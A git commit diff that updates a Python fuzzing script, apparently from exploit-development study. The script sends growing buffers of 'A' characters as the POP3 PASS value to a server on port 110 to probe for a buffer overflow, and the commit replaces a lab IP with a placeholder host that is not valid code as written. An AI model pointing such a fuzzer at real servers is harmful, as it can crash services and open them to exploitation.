ed5e7d57f8a2e0ac78910e9c81142a62593dc55b
rubick1896 <wenrui29@uw.edu>
2016-07-18 17:10:38 -0400

    Update pop3-pass-fuzz.py

--- buffer-overflow/pop3-pass-fuzz.py
+++ buffer-overflow/pop3-pass-fuzz.py
@@ -9,10 +9,13 @@ while len(buffer) <= 30:
   buffer.append("A" * counter)
   counter=counter + 200
 
+host = #ip address
+port = 110
+
 for string in buffer:
   print "Fuzzing PASS with %s bytes" % len(string)
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  connect = s.connect(('10.11.9.105',110))
+  connect = s.connect((host,port))
   s.recv(1024)
   s.send('USER test\r\n')
   s.recv(1024)
